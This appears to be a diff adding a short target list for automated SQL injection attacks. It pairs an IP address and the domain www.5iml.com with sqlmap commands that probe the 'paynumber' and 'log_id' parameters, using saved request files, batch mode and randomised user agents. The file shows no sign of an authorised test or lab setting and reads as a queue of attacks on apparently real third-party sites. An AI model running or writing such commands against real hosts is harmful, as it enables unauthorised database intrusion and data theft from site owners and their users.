@@ -1,0 +1,11 @@
+129.211.167.186
+request
+sqlmap -r "sqlmap_requests\006_SQL_Injection_paynumber_3883883625518729183.txt" --batch --smart --random-agent --output-dir "sqlmap_output\006_3883883625518729183" -p "paynumber"
+
+www.5iml.com
+request
+sqlmap -r "sqlmap_requests\008_SQL_Injection_log_id_3884137629314188306.txt" --batch --smart --random-agent --output-dir "sqlmap_output\008_3884137629314188306" -p "log_id"
+
+www.5iml.com
+request
+sqlmap -r "sqlmap_requests\009_SQL_Injection_log_id_3884146621516088726.txt" --batch --smart --random-agent --output-dir "sqlmap_output\009_3884146621516088726" -p "log_id"
